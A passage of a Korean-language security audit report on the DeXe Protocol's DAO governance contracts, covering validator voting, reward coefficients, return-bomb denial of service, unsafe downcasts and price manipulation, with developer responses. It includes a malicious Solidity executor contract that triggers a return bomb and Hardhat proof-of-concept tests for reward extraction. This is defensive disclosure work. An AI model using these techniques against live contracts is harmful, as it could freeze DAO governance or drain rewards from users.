**설명:** 검증자는 악의적인 제안이 실행되는 것을 방지하기 위한 2단계 확인으로 DAO가 지정한 신뢰할 수 있는 당사자입니다.
현재 시스템은 다음과 같은 제약 조건으로 설계되었습니다:
1. `GovValidators::changeBalances`를 실행하는 것이 검증자에게 투표권을 할당하거나 철회하는 유일한 방법입니다.
2. 검증자 토큰 잔액을 보유한 사람은 누구나 검증자가 됩니다.
3. `GovValidatorsVote::vote`는 검증자 제안이 생성되었을 때의 snapshotId에서의 토큰 잔액만 투표에 사용되도록 합니다.

이 설계는 다음과 관련된 보안 위험을 다루지 않습니다:
a. 개인 키 분실
b. 비활성 검증자
c. 잘못 작동하는 검증자

검증자 토큰 잔액을 0으로 줄여 검증자를 제명하는 조항이 있지만, 현재 시스템에는 검증자가 소급 적용된(back-dated) snapshotId를 사용하여 활성 제안에 투표하는 것을 방지하는 조항이 없습니다. 검증자가 DAO의 이익과 일치하지 않고 투표에 의해 제명되는 경우, 그러한 검증자가 활성 제안의 투표 결과에 영향을 미치도록 허용하는 것은 보안 위험이라고 생각합니다.

**영향:** 더 이상 DAO의 최선의 이익을 보호하는 신뢰할 수 있는 역할을 수행하지 않는 검증자가 여전히 과거 투표권을 기반으로 DAO의 미래를 통제합니다.

**개념 증명 (Proof of Concept):** 다음 시나리오를 고려하십시오:
- Alice는 DAO A에서 10%의 투표권을 가진 검증자입니다.
- Alice는 개인 키를 분실했습니다.
- 검증자는 Alice 잔액을 0으로 줄이는 `GovValidators::changeBalances`를 실행하기 위해 투표합니다.
- Alice가 10%의 투표권을 가진 snapshotId를 사용하는 중요한 제안 P가 현재 활성 상태입니다.
- 검증자는 P가 DAO의 최선의 이익이 아니라고 생각하여 반대 투표를 합니다.
- Alice의 키는 이제 10%의 투표권으로 투표하는 해커 Bob에 의해 제어됩니다.
- 제안이 정족수에 도달하고 통과됩니다.

이것은 DAO에 대한 보안 위험입니다.

**권장 완화 방법:** `GovValidator`의 `vote` 및 `cancelVote` 함수에 `isValidator` 확인을 추가하는 것을 고려하십시오. 이렇게 하면 현재 잔액이 0인 검증자가 소급 적용된 투표권을 기반으로 투표 결과에 영향을 미치는 것을 방지할 수 있습니다.

**Dexe:**
인지함; 우리는 검증자 스냅샷을 사용하고 있으므로 과거 제안에서 그들은 약간의 투표권을 가질 수 있습니다. 그렇지 않으면 검증자를 제거해도 진행 중인 제안에서 투표가 제거되어야 하므로(온체인에서 수행하기에 이상적이지 않음) 이 동작을 변경하지 않을 것입니다.


### `RewardsInfo::voteRewardsCoefficient`를 변경하기 위한 투표는 활성 제안에 대한 투표 보상을 소급적으로 변경하는 의도하지 않은 부작용을 가짐

**설명:** `GovSettings::editSettings`는 내부 제안을 통해 실행할 수 있는 함수 중 하나입니다. 이 함수가 호출되면 설정은 `GovSettings::_validateProposalSettings`를 통해 검증됩니다. 이 함수는 설정을 업데이트하는 동안 `RewardsInfo::voteRewardsCoefficient`의 값을 확인하지 않습니다. 이 설정에는 하한선이나 상한선이 없습니다.

그러나 아래 표시된 `GovPoolRewards::_getInitialVotingRewards`에서 계산된 대로 이 계수가 투표 보상을 증폭시킨다는 점에 주목했습니다.

```solidity
    function _getInitialVotingRewards(
        IGovPool.ProposalCore storage core,
        IGovPool.VoteInfo storage voteInfo
    ) internal view returns (uint256) {
        (uint256 coreVotes, uint256 coreRawVotes) = voteInfo.isVoteFor
            ? (core.votesFor, core.rawVotesFor)
            : (core.votesAgainst, core.rawVotesAgainst);

        return
            coreRawVotes.ratio(core.settings.rewardsInfo.voteRewardsCoefficient, PRECISION).ratio(
                voteInfo.totalVoted,
                coreVotes
            ); //@audit -> initial rewards are calculated proportionate to the vote rewards coefficient
    }
```
이것은 동일한 제안에 대해 보상이 청구된 시점에 따라 다른 투표자가 다른 보상을 받을 수 있는 의도하지 않은 부작용을 가집니다. `core.settings.rewardsInfo.voteRewardsCoefficient`가 0으로 투표되는 극단적인 경우, 업데이트 전에 보상을 청구한 투표자는 약속대로 지급받은 반면 나중에 청구한 투표자는 아무것도 받지 못하는 상황이 발생합니다.

**영향:** `rewardsCoefficient`를 업데이트하면 오래된 제안에 대한 불공정한 보상 분배가 발생할 수 있습니다. 주어진 제안에 대한 투표 보상은 사전에 전달되므로, 이는 사용자에게 약속된 보상이 이행되지 않는 상황으로 이어질 수 있습니다.

**개념 증명 (Proof of Concept):** N/A

**권장 완화 방법:** `voteRewardMultiplier`와 제안 생성 시간을 동결하는 것을 고려하십시오. 내부 투표를 통한 이 설정의 향후 업데이트는 오래된 제안에 대한 보상을 변경해서는 안 됩니다.

**Dexe:**
인지함; nftMultiplier 주소를 변경하는 것과 유사한 문제입니다. DAO가 이러한 매개변수를 변경하기로 결정하면 이 변경 사항은 과거의 제안을 포함한 모든 제안에 적용되는 것이 우리의 설계입니다.
### 신뢰할 수 없는 실행 계약을 호출할 때 반환 폭탄(return bombs)으로 인해 제안 실행이 DOS(서비스 거부)될 수 있음

**설명:** `GovPool::execute`는 저수준 호출(low-level call)을 실행할 때 반환 폭탄을 확인하지 않습니다. 반환 폭탄은 매우 큰 bytes 배열로, 트랜잭션을 실행하려는 모든 시도를 `out-of-gas` 예외로 이끄는 메모리 확장을 유발합니다.

이것은 DAO에 잠재적으로 위험한 결과를 초래할 수 있습니다. 한 가지 가능한 결과는 "일방적인" 실행입니다. 즉, 투표가 성공하면 "actionsFor"가 실행될 수 있지만 투표가 실패하면 "actionsAgainst"가 DOS될 수 있습니다.

영리한 제안 생성자는 `actionsFor`만 실행될 수 있고 `actionsAgainst`를 실행하려는 시도는 영구적으로 DOS되도록 제안을 설계할 수 있습니다(POC 계약 참조).

이는 `GovPoolExecute::execute`가 특정 작업에 할당된 잠재적으로 신뢰할 수 없는 `executor`에 대해 저수준 호출을 수행하기 때문에 가능합니다.

```solidity
   function execute(
        mapping(uint256 => IGovPool.Proposal) storage proposals,
        uint256 proposalId
    ) external {
        .... // code

        for (uint256 i; i < actionsLength; i++) {
>            (bool status, bytes memory returnedData) = actions[i].executor.call{
                value: actions[i].value
            }(actions[i].data); //@audit returnedData could expand memory and cause out-of-gas exception

            require(status, returnedData.getRevertMsg());
        }
   }
```

**영향:** 투표 작업은 생성자에 의해 조작되어 두 가지 잠재적인 문제를 일으킬 수 있습니다:

1. 성공적인 투표 후에도 제안 작업을 실행할 수 없습니다.
2. 일부 작업은 실행될 수 있지만 다른 작업은 DOS될 수 있는 일방적인 실행.

**개념 증명 (Proof of Concept):** 다음의 악의적인 제안 작업 실행자 계약을 고려하십시오. 제안이 통과되면(`isVotesFor` = true) `vote()` 함수는 빈 bytes를 반환하고, 제안이 실패하면(`isVotesFor` = false) 동일한 함수가 거대한 bytes 배열을 반환하여 호출자에게 효과적으로 "out-of-gas" 예외를 유발합니다.

```solidity
contract MaliciousProposalActionExecutor is IProposalValidator{

    function validate(IGovPool.ProposalAction[] calldata actions) external view override returns (bool valid){
    	valid = true;
    }

    function vote(
        uint256 proposalId,
        bool isVoteFor,
        uint256 voteAmount,
        uint256[] calldata voteNftIds
    ) external returns(bytes memory result){

	if(isVoteFor){
		// @audit implement actions for successful vote
        	return ""; // 0 bytes
        }
	else{
		// @audit implement actions for failed vote

		// Create a large bytes array
                assembly{
                     revert(0, 1_000_000)
              }
	}

   }
}
```

**권장 완화 방법:** 반환 폭탄을 피하기 위해 신뢰할 수 없는 계약을 호출할 때 [`ExcessivelySafeCall`](https://github.com/nomad-xyz/ExcessivelySafeCall)을 사용하는 것을 고려하십시오.

**Dexe:**
인지함; 우리는 제안이 "성공" 상태에서 갇힐 수 있다는 사실을 알고 있습니다. 그러나 DAO가 이미 이 제안을 완료하기로 결정했으므로 온체인에서 이 동작을 변경하지 않을 것입니다. 프런트엔드에 일부 라벨을 추가할 수 있습니다.

\clearpage
## 낮은 위험 (Low Risk)


### uint256에서 uint56으로의 안전하지 않은 다운캐스팅은 조용히 오버플로되어 검증자에게 잘못된 투표권을 초래할 수 있음

**설명:** `GovValidatorsCreate::createInternalProposal()` [L38](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/libs/gov/gov-validators/GovValidatorsCreate.sol#L38) 및 `createExternalProposal()` [L67](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/libs/gov/gov-validators/GovValidatorsCreate.sol#L67)은 `uint256`에서 `uint56`으로 안전하지 않은 다운캐스팅을 수행하여 조용히 오버플로될 수 있습니다.

**영향:** 오버플로가 발생하면 제안이 잘못된 `snapshotId`로 생성되어 검증자에게 잘못된 투표권을 부여합니다.

**권장 완화 방법:** 다운캐스트가 오버플로될 경우 되돌려지도록 OpenZeppelin [SafeCast](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeCast.sol)를 사용하십시오.

**Dexe:**
인지함. uint56은 증분 스냅샷으로 도달할 수 없습니다. 72,057,594,037,927,935만큼 큽니다.


### `AbstractERC721Multiplier`의 누락된 스토리지 갭(storage gap)으로 인해 업그레이드 전 스토리지 슬롯 충돌 발생 가능

**설명:** [`AbstractERC721Multiplier`](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/ERC721/multipliers/AbstractERC721Multiplier.sol)는 상태가 있지만 스토리지 갭이 없는 업그레이드 가능한 계약이며, 자체 상태를 가진 1개의 자식 계약 [`DexeERC721Multiplier`](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/ERC721/multipliers/DexeERC721Multiplier.sol)를 가지고 있습니다.

**영향:** `AbstractERC721Multiplier` 계약에 추가 상태가 스토리지에 추가되는 업그레이드가 발생하면 자식 계약 `DexeERC721Multiplier` 내의 스토리지가 덮어쓰여지는 스토리지 충돌이 발생할 수 있습니다.

**개념 증명 (Proof of Concept):** N/A

**권장 완화 방법:** `AbstractERC721Multiplier` 계약에 스토리지 갭을 추가하십시오.

**Dexe:**
[PR164](https://github.com/dexe-network/DeXe-Protocol/commit/cdf9369193e1b2d6640c975d2c8e872710f6e065)에서 수정되었습니다.

**Cyfrin:** 확인됨.


### 반환된 데이터가 필요하지 않은 경우 가스 기르핑(griefing) 공격을 방지하기 위해 저수준 `call()`을 사용하십시오

**설명:** 반환된 데이터가 필요하지 않을 때 `call()`을 사용하면 거대한 반환 데이터 페이로드로 인한 가스 기르핑 공격에 불필요하게 노출됩니다. [예](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/libs/utils/TokenBalance.sol#L31):

```solidity
(bool status, ) = payable(receiver).call{value: amount}("");
require(status, "Gov: failed to send eth");
```

이것은 다음을 작성하는 것과 같습니다:

```solidity
(bool status, bytes memory data ) = payable(receiver).call{value: amount}("");
require(status, "Gov: failed to send eth");
```

두 경우 모두 반환된 데이터가 전혀 필요하지 않음에도 불구하고 반환된 데이터를 메모리에 복사해야 하므로 계약이 가스 기르핑 공격에 노출됩니다.

**영향:** 계약이 불필요하게 가스 기르핑 공격에 노출됩니다.

**권장 완화 방법:** 반환된 데이터가 필요하지 않은 경우 다음과 같이 저수준 호출을 사용하십시오:
```solidity
bool status;
assembly {
    status := call(gas(), receiver, amount, 0, 0, 0, 0)
}
```

[ExcessivelySafeCall](https://github.com/nomad-xyz/ExcessivelySafeCall) 사용을 고려하십시오.

**Dexe:**
인지함; 합법적인 계약에 대한 호출은 되돌려지지 않습니다. 그러나 계약이 손상된 경우 당황(panic)하여 동일한 결과를 얻을 수 있습니다.


### 소규모 위임은 피위임자가 마이크로풀 보상을 받는 것을 방지하면서 위임자는 여전히 보상함

**설명:** 소규모 위임은 피위임자가 마이크로풀 보상을 받는 것을 방지하면서 위임자는 여전히 보상합니다.

**영향:** 피위임자는 마이크로풀 보상을 받지 못하지만 위임자는 소량으로 위임하여 보상을 추출할 수 있습니다. 이것은 우리가 심각하게 이용 가능한지 아직 파악하지 못한 흥미로운 엣지 케이스이지만, 다수의 소규모 작업이 하나의 대규 작업과 동일한 효과를 가져야 한다는 유사한 시스템의 핵심 불변성을 깨뜨립니다. 이 경우 여러 소규모 위임은 하나의 대규모 위임과 *다른* 효과를 초래하여 이 핵심 시스템 불변성을 깨뜨립니다.

**개념 증명 (Proof of Concept):** `GovPool.test.js`의 `describe("getProposalState()", () => {` 섹션 아래에 PoC를 추가하십시오:
```javascript
      it("audit small delegations prevent delegatee from receiving micropool rewards while still rewarding delegator", async () => {
        // so proposals doesn't need to go to validators
        await changeInternalSettings(false);

        // required for executing the proposals
        await govPool.deposit(govPool.address, wei("200"), []);

        // create 4 proposals; only the first 2 will be executed
        // create proposal 1
        await govPool.createProposal(
          "example.com",
          [[govPool.address, 0, getBytesGovVote(4, wei("100"), [], true)]],
          [[govPool.address, 0, getBytesGovVote(4, wei("100"), [], false)]]
        );
        // create proposal 2
        await govPool.createProposal(
          "example.com",
          [[govPool.address, 0, getBytesGovVote(5, wei("100"), [], true)]],
          [[govPool.address, 0, getBytesGovVote(5, wei("100"), [], false)]]
        );
        // create proposal 3
        await govPool.createProposal(
          "example.com",
          [[govPool.address, 0, getBytesGovVote(5, wei("100"), [], true)]],
          [[govPool.address, 0, getBytesGovVote(5, wei("100"), [], false)]]
        );
        // create proposal 4
        await govPool.createProposal(
          "example.com",
          [[govPool.address, 0, getBytesGovVote(5, wei("100"), [], true)]],
          [[govPool.address, 0, getBytesGovVote(5, wei("100"), [], false)]]
        );

        let proposal1Id = 2;
        let proposal2Id = 3;

        let DELEGATEE  = await accounts(10);
        let DELEGATOR1 = await accounts(9);
        let DELEGATOR2 = await accounts(8);
        let DELEGATOR3 = await accounts(7);

        let delegator1Tokens = wei("50000000000000000000");
        let delegator2Tokens = wei("150000000000000000000");
        let delegator3Tokens = "4";
        let delegateeReward  = wei("40000000000000000000");
        let delegator1Reward = wei("40000000000000000000");
        let delegator2Reward = wei("120000000000000000000");
        let delegator3Reward = "3";

        // mint tokens & deposit them to have voting power
        await token.mint(DELEGATOR1, delegator1Tokens);
        await token.approve(userKeeper.address, delegator1Tokens, { from: DELEGATOR1 });
        await govPool.deposit(DELEGATOR1, delegator1Tokens, [], { from: DELEGATOR1 });
        await token.mint(DELEGATOR2, delegator2Tokens);
        await token.approve(userKeeper.address, delegator2Tokens, { from: DELEGATOR2 });
        await govPool.deposit(DELEGATOR2, delegator2Tokens, [], { from: DELEGATOR2 });
        await token.mint(DELEGATOR3, delegator3Tokens);
        await token.approve(userKeeper.address, delegator3Tokens, { from: DELEGATOR3 });
        await govPool.deposit(DELEGATOR3, delegator3Tokens, [], { from: DELEGATOR3 });

        // for proposal 1, only DELEGATOR1 & DELEGATOR2 will delegate to DELEGATEE
        await govPool.delegate(DELEGATEE, delegator1Tokens, [], { from: DELEGATOR1 });
        await govPool.delegate(DELEGATEE, delegator2Tokens, [], { from: DELEGATOR2 });

        // DELEGATEE votes on proposal 1
        await govPool.vote(proposal1Id, true, "0", [], { from: DELEGATEE });

        // verify DELEGATEE's voting
        assert.equal(
          (await govPool.getUserVotes(proposal1Id, DELEGATEE, VoteType.PersonalVote)).totalRawVoted,
          "0" // personal votes remain the same
        );
        assert.equal(
          (await govPool.getUserVotes(proposal1Id, DELEGATEE, VoteType.MicropoolVote)).totalRawVoted,
          wei("200000000000000000000") // delegated votes included
        );
        assert.equal(
          (await govPool.getTotalVotes(proposal1Id, DELEGATEE, VoteType.PersonalVote))[0].toFixed(),
          wei("200000000000000000000") // delegated votes included
        );

        // advance time
        await setTime((await getCurrentBlockTime()) + 1);

        // proposal 1 now in SucceededFor state
        assert.equal(await govPool.getProposalState(proposal1Id), ProposalState.SucceededFor);

        // execute proposal 1
        await govPool.execute(proposal1Id);

        // verify pending rewards via GovPool::getPendingRewards()
        let pendingRewards = await govPool.getPendingRewards(DELEGATEE, [proposal1Id]);

        assert.deepEqual(pendingRewards.onchainTokens, [rewardToken.address]);
        assert.equal(pendingRewards.votingRewards[0].personal, "0");
        assert.equal(pendingRewards.votingRewards[0].micropool, delegateeReward);
        assert.equal(pendingRewards.votingRewards[0].treasury, "0");

        pendingRewards = await govPool.getPendingRewards(DELEGATOR1, [proposal1Id]);

        assert.deepEqual(pendingRewards.onchainTokens, [rewardToken.address]);
        assert.equal(pendingRewards.votingRewards[0].personal, "0");
        assert.equal(pendingRewards.votingRewards[0].micropool, "0");
        assert.equal(pendingRewards.votingRewards[0].treasury, "0");

        pendingRewards = await govPool.getPendingRewards(DELEGATOR2, [proposal1Id]);

        assert.deepEqual(pendingRewards.onchainTokens, [rewardToken.address]);
        assert.equal(pendingRewards.votingRewards[0].personal, "0");
        assert.equal(pendingRewards.votingRewards[0].micropool, "0");
        assert.equal(pendingRewards.votingRewards[0].treasury, "0");

        pendingRewards = await govPool.getPendingRewards(DELEGATOR3, [proposal1Id]);

        assert.deepEqual(pendingRewards.onchainTokens, [rewardToken.address]);
        assert.equal(pendingRewards.votingRewards[0].personal, "0");
        assert.equal(pendingRewards.votingRewards[0].micropool, "0");
        assert.equal(pendingRewards.votingRewards[0].treasury, "0");

        // verify pending delegator rewards via GovPool::getDelegatorRewards()
        pendingRewards = await govPool.getDelegatorRewards([proposal1Id], DELEGATOR1, DELEGATEE);
        assert.deepEqual(pendingRewards.rewardTokens, [rewardToken.address]);
        assert.deepEqual(pendingRewards.isVoteFor, [true]);
        assert.deepEqual(pendingRewards.isClaimed, [false]);
        assert.deepEqual(pendingRewards.expectedRewards, [delegator1Reward]);

        pendingRewards = await govPool.getDelegatorRewards([proposal1Id], DELEGATOR2, DELEGATEE);
        assert.deepEqual(pendingRewards.rewardTokens, [rewardToken.address]);
        assert.deepEqual(pendingRewards.isVoteFor, [true]);
        assert.deepEqual(pendingRewards.isClaimed, [false]);
        assert.deepEqual(pendingRewards.expectedRewards, [delegator2Reward]);

        pendingRewards = await govPool.getDelegatorRewards([proposal1Id], DELEGATOR3, DELEGATEE);
        assert.deepEqual(pendingRewards.rewardTokens, [rewardToken.address]);
        assert.deepEqual(pendingRewards.isVoteFor, [true]);
        assert.deepEqual(pendingRewards.isClaimed, [false]);
        assert.deepEqual(pendingRewards.expectedRewards, ["0"]);

        // reward balances 0 before claiming rewards
        assert.equal((await rewardToken.balanceOf(DELEGATEE)).toFixed(), "0");
        assert.equal((await rewardToken.balanceOf(DELEGATOR1)).toFixed(), "0");
        assert.equal((await rewardToken.balanceOf(DELEGATOR2)).toFixed(), "0");

        // claim rewards
        await govPool.claimRewards([proposal1Id], { from: DELEGATEE });
        await govPool.claimMicropoolRewards([proposal1Id], DELEGATEE, { from: DELEGATOR1 });
        await govPool.claimMicropoolRewards([proposal1Id], DELEGATEE, { from: DELEGATOR2 });

        // verify reward balances after claiming rewards
        assert.equal((await rewardToken.balanceOf(DELEGATEE)).toFixed(), delegateeReward);
        assert.equal((await rewardToken.balanceOf(DELEGATOR1)).toFixed(), delegator1Reward);
        assert.equal((await rewardToken.balanceOf(DELEGATOR2)).toFixed(), delegator2Reward);

        // for proposal 2, DELEGATOR3 will additionally delegate a small amount to DELEGATEE
        // when delegating small token amounts (max 4 in this configuration), DELEGATOR3 is
        // able to extract micropool rewards while not giving any micropool rewards to DELEGATEE
        // nor impacting the micropool rewards of the other delegators
        await govPool.delegate(DELEGATEE, delegator3Tokens, [], { from: DELEGATOR3 });

        // DELEGATEE votes on proposal 2
        await govPool.vote(proposal2Id, true, "0", [], { from: DELEGATEE });

        // verify DELEGATEE's voting
        assert.equal(
          (await govPool.getUserVotes(proposal2Id, DELEGATEE, VoteType.PersonalVote)).totalRawVoted,
          "0" // personal votes remain the same
        );
        assert.equal(
          (await govPool.getUserVotes(proposal2Id, DELEGATEE, VoteType.MicropoolVote)).totalRawVoted,
          wei("20000000000000000000") + delegator3Tokens // DELEGATOR3 votes included
        );
        assert.equal(
          (await govPool.getTotalVotes(proposal2Id, DELEGATEE, VoteType.PersonalVote))[0].toFixed(),
          wei("20000000000000000000") + delegator3Tokens // DELEGATOR3 votes included
        );

        // advance time
        await setTime((await getCurrentBlockTime()) + 1);

        // proposal 2 now in SucceededFor state
        assert.equal(await govPool.getProposalState(proposal2Id), ProposalState.SucceededFor);

        // execute proposal 2
        await govPool.execute(proposal2Id);

        // verify pending rewards via GovPool::getPendingRewards()
        pendingRewards = await govPool.getPendingRewards(DELEGATEE, [proposal2Id]);

        assert.deepEqual(pendingRewards.onchainTokens, [rewardToken.address]);
        assert.equal(pendingRewards.votingRewards[0].personal, "0");
        // DELEGATEE doesn't receive any additional micropool rewards even though
        // DELEGATOR3 is now delegating to them
        assert.equal(pendingRewards.votingRewards[0].micropool, delegateeReward);
        assert.equal(pendingRewards.votingRewards[0].treasury, "0");

        pendingRewards = await govPool.getPendingRewards(DELEGATOR1, [proposal2Id]);

        assert.deepEqual(pendingRewards.onchainTokens, [rewardToken.address]);
        assert.equal(pendingRewards.votingRewards[0].personal, "0");
        assert.equal(pendingRewards.votingRewards[0].micropool, "0");
        assert.equal(pendingRewards.votingRewards[0].treasury, "0");

        pendingRewards = await govPool.getPendingRewards(DELEGATOR2, [proposal2Id]);

        assert.deepEqual(pendingRewards.onchainTokens, [rewardToken.address]);
        assert.equal(pendingRewards.votingRewards[0].personal, "0");
        assert.equal(pendingRewards.votingRewards[0].micropool, "0");
        assert.equal(pendingRewards.votingRewards[0].treasury, "0");

        pendingRewards = await govPool.getPendingRewards(DELEGATOR3, [proposal2Id]);

        assert.deepEqual(pendingRewards.onchainTokens, [rewardToken.address]);
        assert.equal(pendingRewards.votingRewards[0].personal, "0");
        assert.equal(pendingRewards.votingRewards[0].micropool, "0");
        assert.equal(pendingRewards.votingRewards[0].treasury, "0");

        // verify pending delegator rewards via GovPool::getDelegatorRewards()
        pendingRewards = await govPool.getDelegatorRewards([proposal2Id], DELEGATOR1, DELEGATEE);
        assert.deepEqual(pendingRewards.rewardTokens, [rewardToken.address]);
        assert.deepEqual(pendingRewards.isVoteFor, [true]);
        assert.deepEqual(pendingRewards.isClaimed, [false]);
        assert.deepEqual(pendingRewards.expectedRewards, [delegator1Reward]);

        pendingRewards = await govPool.getDelegatorRewards([proposal2Id], DELEGATOR2, DELEGATEE);
        assert.deepEqual(pendingRewards.rewardTokens, [rewardToken.address]);
        assert.deepEqual(pendingRewards.isVoteFor, [true]);
        assert.deepEqual(pendingRewards.isClaimed, [false]);
        assert.deepEqual(pendingRewards.expectedRewards, [delegator2Reward]);

        pendingRewards = await govPool.getDelegatorRewards([proposal2Id], DELEGATOR3, DELEGATEE);
        assert.deepEqual(pendingRewards.rewardTokens, [rewardToken.address]);
        assert.deepEqual(pendingRewards.isVoteFor, [true]);
        assert.deepEqual(pendingRewards.isClaimed, [false]);
        // DELEGATOR3 now gets micropool rewards even though DELEGATEE isn't getting
        // any additional rewards
        assert.deepEqual(pendingRewards.expectedRewards, ["3"]);

        // reward balances same as rewards from proposal 1
        assert.equal((await rewardToken.balanceOf(DELEGATEE)).toFixed(), delegateeReward);
        assert.equal((await rewardToken.balanceOf(DELEGATOR1)).toFixed(), delegator1Reward);
        assert.equal((await rewardToken.balanceOf(DELEGATOR2)).toFixed(), delegator2Reward);

        // claim rewards
        await govPool.claimRewards([proposal2Id], { from: DELEGATEE });
        await govPool.claimMicropoolRewards([proposal2Id], DELEGATEE, { from: DELEGATOR1 });
        await govPool.claimMicropoolRewards([proposal2Id], DELEGATEE, { from: DELEGATOR2 });
        await govPool.claimMicropoolRewards([proposal2Id], DELEGATEE, { from: DELEGATOR3 });

        // verify reward balances after claiming rewards
        // for DELEGATEE, DELEGATOR1 & DELEGATOR2 balances have multiplied by 2 as they
        // received the exact same rewards; the participation of DELEGATOR3 did not result in
        // any additional rewards for DELEGATEE
        assert.equal((await rewardToken.balanceOf(DELEGATEE)).toFixed(), wei("80000000000000000000"));
        assert.equal((await rewardToken.balanceOf(DELEGATOR1)).toFixed(), wei("80000000000000000000"));
        assert.equal((await rewardToken.balanceOf(DELEGATOR2)).toFixed(), wei("240000000000000000000"));

        // DELEGATOR3 was able to get micropool rewards by delegating to DELEGATEE while
        // ensuring that DELEGATEE didn't get any additional rewards
        assert.equal((await rewardToken.balanceOf(DELEGATOR3)).toFixed(), "3");

        // this doesn't seem to be seriously exploitable but it does break one of the core invariants
        // in similar systems: that doing a bunch of smaller operations should have the same outcome as
        // doing one equally big operation, eg: 25 different users each delegating 4 tokens to the voter
        // should have the same outcome as 1 user delegating 100 tokens to the voter? */
      });
```

실행: `npx hardhat test --grep "audit small delegations prevent delegatee"`

**권장 완화 방법:** 최소 투표 금액(minimum voting amount)이 있는 것과 유사하게 최소 위임 금액(minimum delegation amount)을 강제하는 것을 고려하십시오.

아마도 `GovUserKeeper::delegateTokens()` [L136](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/user-keeper/GovUserKeeper.sol#L136) 및 `undelegateTokens()` [L160](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/user-keeper/GovUserKeeper.sol#L160)에서 `_micropoolsInfo[delegatee].tokenBalance == 0 || _micropoolsInfo[delegatee].tokenBalance > minimumVoteAmount`임을 강제하십시오.

위임 및 위임 해제 모두에서 이를 강제함으로써 X를 위임한 다음 Y를 위임 해제하여 X-Y > 0이지만 매우 작은 상황이 발생하지 않도록 방지할 수 있습니다.

**Dexe:**
인지함; 이것은 계산의 정밀도 오류일 뿐입니다. 보상 구성에 따라 1 또는 2 wei가 과정에서 손실될 수 있습니다.

\clearpage
## 정보성 (Informational)


### `GovValidators`는 양도 불가능한 `GovValidatorToken`을 비검증자에게 전송하여 검증자로 만들 수 있음

**설명:** `GovValidators`는 양도 불가능한 `GovValidatorToken`을 비검증자에게 전송하여 검증자로 만들 수 있습니다.

**영향:** 양도 불가능한 토큰을 전송하여 비검증자를 검증자로 만들 수 있습니다. 그러나 실제로 `GovValidators` 계약이 이 호출을 수행하도록 만드는 방법을 아직 찾지 못했으므로 INFO로 표시됩니다. 또한 `GovValidatorToken`을 `GovValidators` 계약에 지출하려면 검증자의 승인이 필요합니다.

**개념 증명 (Proof of Concept):** `GovValidators.test.js`에 추가:
```javascript
    describe("audit transfer nontransferable GovValidatorToken", () => {
      it("audit GovValidators can transfer GovValidatorToken to non-validators making them Validators", async () => {
        // SECOND is a validator as they have GovValidatorToken
        assert.equal(await validators.isValidator(SECOND), true);
        assert.equal((await validatorsToken.balanceOf(SECOND)).toFixed(), wei("100"));

        // NOT_VALIDATOR is a new address that isn't a validator
        let NOT_VALIDATOR = await accounts(3);
        assert.equal(await validators.isValidator(NOT_VALIDATOR), false);

        const { impersonate } = require("../helpers/impersonator");
        // SECOND gives approval to GovValidators over their GovValidatorToken
        await impersonate(SECOND);
        await validatorsToken.approve(validators.address, wei("10"), { from: SECOND });

        // GovValidators can transfer SECOND's GovValidatorToken to NON_VALIDATOR
        await impersonate(validators.address);
        await validatorsToken.transferFrom(SECOND, NOT_VALIDATOR, wei("10"), { from: validators.address });

        // this makes NON_VALIDATOR a VALIDATOR
        assert.equal((await validatorsToken.balanceOf(NOT_VALIDATOR)).toFixed(), wei("10"));
        assert.equal(await validators.isValidator(NOT_VALIDATOR), true);
      });
    });
```

실행: `npx hardhat test --grep "audit transfer nontransferable GovValidatorToken"`

**권장 완화 방법:** 발행 및 소각은 허용하지만 전송은 방지하도록 [`GovValidatorsToken::_beforeTokenTransfer()`](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/gov/validators/GovValidatorsToken.sol#L32-L38) 구현을 재고하십시오.

**Dexe:**
커밋 [dca45e5](https://github.com/dexe-network/DeXe-Protocol/commit/dca45e546c1ad44ae8d724f8942c80ec6841ee1b)에서 수정되었습니다.

**Cyfrin:** 확인됨.


### 반환된 가격이 플래시 론을 통해 조작될 수 있는 풀 준비금(reserves) 기반의 `UniswapV2Router::getAmountsOut()`

**설명:** [`PriceFeed`](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/core/PriceFeed.sol)는 [`UniswapV2PathFinder`](https://github.com/dexe-network/DeXe-Protocol/tree/f2fe12eeac0c4c63ac39670912640dc91d94bda5/contracts/libs/price-feed/UniswapV2PathFinder.sol)를 사용하며, 이는 다시 `UniswapV2Router::getAmountsOut()` 및 `getAmountsIn()`을 사용합니다. 이들은 [풀 준비금을 기반](https://github.com/Uniswap/v2-periphery/blob/master/contracts/libraries/UniswapV2Library.sol#L62-L70)으로 하므로 공격자가 플래시 론을 통해 반환된 가격을 조작할 수 있습니다.

**영향:** 공격자가 플래시 론을 통해 반환된 가격을 조작할 수 있습니다. `PriceFeed`가 현재 코드베이스의 어디에서도 사용되지 않는 것으로 보이므로 정보성(Informational)으로 표시되었으며, 현재 시스템에 미치는 영향은 없습니다.

**권장 완화 방법:** 조작 방지 가격 데이터를 위해 [Uniswap TWAP](https://docs.uniswap.org/contracts/v2/concepts/core-concepts/oracles) 또는 Chainlink 가격 오라클을 사용하십시오.

**Dexe:**
기능이 제거되었습니다.


### 제안 생성은 제안을 검증자에게 이동하는 것과 정확히 동일한 보상을 가지므로 불균형한 인센티브 생성

**설명:** `GovPool::createProposal`을 통해 새 제안을 시작하는 사용자는 성공적인 풀 투표 후 검증자에게 제안을 단순히 이동하는 사용자와 동일한 인센티브를 보상받습니다.

